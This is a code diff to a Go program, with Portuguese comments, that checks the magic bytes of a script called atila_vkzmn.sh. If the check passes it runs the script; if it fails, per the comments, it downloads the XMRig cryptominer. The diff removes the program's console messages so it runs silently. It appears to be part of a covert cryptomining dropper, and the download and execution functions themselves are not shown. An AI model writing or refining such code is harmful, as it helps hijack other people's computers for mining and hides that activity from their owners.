@@ -3,7 +3,7 @@ package main
 //essa funcao vai verifica o magic  byte do arquivo atila_vkzmn.sh
 
 import (
-	"fmt"
+
 	"io/ioutil"
 	"os"
 	"strings"
@@ -28,27 +28,36 @@ func magic_byte() {
 			out := strings.Contains(magic_str, my_magic_byte)
 
 			if out == true {
+
 				file_ok = 23
-			}
+
+		
+                	}
 
 		}
 
 	}
 
+
+
 	if file_ok == 23 { //execute script
 
-		fmt.Println("file ok") //call exec_vkzmn
+		//file ok
 
 		exec_vkzmn()
 
 	} else {
 
-		fmt.Println("file not valid abaixe o xmrig raw")
+	
 
 		//file not valid download xmrig raw
 
 		raw_xmrig()
 
+
+
 	}
+
+
 
 }
